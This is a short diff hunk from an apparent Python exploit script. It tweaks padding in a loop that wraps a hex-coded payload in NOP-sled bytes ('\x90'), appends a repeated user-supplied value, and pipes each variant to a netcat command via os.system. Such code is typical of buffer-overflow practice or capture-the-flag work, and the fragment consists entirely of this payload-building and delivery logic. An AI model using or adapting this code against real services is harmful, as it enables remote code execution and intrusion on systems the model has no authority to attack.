@@ -52,7 +52,7 @@ for i in range(0, len(hex_code)):
 diff = to_range - from_range - hc.count('x')
 
 for i in range(0, 6):
-    hc = i*"\\x90" + (diff/2 * "\\x90") + hc + (diff/4 * argv[2].decode())
+    hc = i*"\\x90" + (diff/2 * "\\x90") + hc + (diff/2 * argv[2].decode())
 
     # print hc
     os.system("`python -c 'print " + hc + "'` | " + netcat)
